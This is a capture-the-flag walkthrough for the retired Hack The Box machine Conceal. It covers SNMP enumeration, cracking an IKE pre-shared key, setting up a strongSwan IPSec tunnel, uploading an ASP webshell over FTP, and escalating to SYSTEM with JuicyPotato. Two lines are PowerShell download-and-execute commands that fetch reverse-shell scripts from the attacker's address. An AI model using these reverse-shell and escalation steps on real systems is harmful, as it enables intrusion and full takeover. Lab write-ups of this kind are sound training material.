# Conceal

This is the write-up for the box Conceal that got retired at the 18th May 2019.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.116    conceal.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/conceal.nmap 10.10.10.116
```

```markdown
Nmap scan report for 10.10.10.116
Host is up (0.048s latency).
All 1000 scanned ports on 10.10.10.116 are filtered
```

There is no port open so we need to do different scans to get any information. 

Full TCP port scan for all 65535 ports:
```markdown
nmap -p- -o nmap/conceal-alltcp.nmap 10.10.10.116
```

UDP scan:
```markdown
nmap -sU -o nmap/conceal-1000udp.nmap 10.10.10.116
```

```markdown
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmp
```

### Checking SNMP

Before we get into the results of the scans we can check for SNMP strings manually. We can use **snmpwalk** or a more verbose tool called **snmp-check**:
```markdown
snmp-check 10.10.10.116
```

We get a lot of interesting results that I put in a file in this folder called **conceal-snmp_check.txt** but here is the interesting stuff:
- IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
- Windows Version 6.3 (Build 15063)
- User: Destitute
- Network Interfaces with IKEv2, PPTP, L2TP
- Listening TCP ports: 
  - 21 - FTP 
  - 80 - HTTP 
  - 135 - Microsoft RPC
  - 139 - NetBIOS
  - 445 - SMB
- Listening UDP ports: 
  - 123 - NTP
  - 161 - SNMP
  - 500 - IPSec / IKE
  - 4500 - IPSec NAT Traversal
  - 5050 - Unknown
  - 5353 - Multicast DNS
  - 5355 - LLMNR
  - 137 - NetBIOS Name Service
  - 138 - NetBIOS Datagram Service
  - 1900 - Microsoft SSDP (UPnP)

## Checking IPSec

The fact that the UDP port 500 is open and we get this IKE VPN password PSK means we need to look further into **IPSec VPN**.
First we try to crack the password manually or search for it on hashes.org and it says:
> Dudecake1!

We can test if we get a response back from the IKE service:
```markdown
ike-scan -M 10.10.10.116
```

```markdown
10.10.10.116    Main Mode Handshake returned
        HDR=(CKY-R=befc472fa43aa6a0)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)
```

We need to focus on the **SA (Security Association)** that is:
- Encrypted in 3DES
- Hashed in SHA1
- Authentication with a PSK that we have
- Life Duration of it is 0x00007080 = 28800 seconds = 8 hours

Now that we have all the important information we need a IPSec Tunneling program called **strongSwan**.

### Configuring strongSwan

In the `manpage` for `ipsec.secrets` we find an example how to configure an IPSec tunnel:
```markdown
# /etc/ipsec.secrets - strongSwan IPsec secrets file
192.168.0.1 %any : PSK "v+NkxY9LLZvwj4qCC2o/gGrWDF2d21jL"
```

So we add this line to the **/etc/ipsec.secrets** file:
```markdown
10.10.10.116 %any : PSK "Dudecake1!"
```

Whenever we make an IPSec connection through stongSwan to the box it uses this PSK.

Next we need to configure **/etc/ipsec.conf** and the help for that can be found in `man ipsec.conf`.
Everything we configure here is with information we already have:
```markdown
conn Conceal
        type=transport
        keyexchange=ikev1
        left=10.10.14.10
        leftprotoport=tcp
        right=10.10.10.116
        rightprotoport=tcp
        authby=psk
        esp=3des-sha1
        ike=3des-sha1-modp1024
        ikelifetime=8h
        fragmentation=yes
        auto=start
```

Starting the IPSec VPN connection:
```markdown
ipsec start --nofork
```

We are now connected and can verify that by doing a port scan on port 445 from which we know that it should be open:
```markdown
nmap -sT -p 445 -Pn 10.10.10.116
```

```markdown
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

Now this port says open and we can enumerate the running services we know from the SNMP scan.

## Checking FTP and HTTP (Port 21 and 80)

Anonymous login on FTP works with no files in there but we can upload files to it.

If we browse to the web page we see the IIS default page and after some enumerating paths we find **/uploads** where it shows the files we uploaded to FTP.
As **ASPX** does not work but **ASP** does we can upload an .asp file to get a webshell and have command execution.

We want to execute a reverse shell. I will take _Invoke-PowerShellTcp.ps1 from Nishang_ that I just call _revshell.ps1_ and it will listen on my IP and port 9001:
```markdown
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/revshell.ps1')"
```

We now started a reverse shell session with the user _Destitute_ and can read the first flag.

## Privilege Escalation

If we look at the privileges of the user _Destitute_ with `whoami /all` we can see the following:
```markdown
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The **SeImpersonatePrivilege** privilege is enabled and this is what we want to abuse with the local privilege escalation tool **JuicyPotato**.

When uploading the JuicyPotato.exe file over FTP we need to set the FTP mode to `binary` and then `put JuicyPotato.exe`.
We create a .bat file with the same command as we invoked into the webshell to spawn a new reverse shell with higher privileges:
```bat
REM This is rootshell.bat

powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/rootshell.ps1')"
```

After uploading the file we can execute JuicyPotato.exe:
```markdown
.\JuicyPotato.exe -t * -p C:\Users\destitute\Documents\revshell.bat -l 9002 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
```

Normally it tries the CLSID of BITS but that won't escalate our privileges so we take the **CLSID of wuauserv** which is _{e60687f7-01a1-40aa-86ac-db1cbf673334}_.
A list of CLSID can be found here: [JuicyPotato CLSID list](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/).

When the program successfully runs, our second reverse shell spawns a shell with the user _NT Authority\SYSTEM_ and we rooted the box!
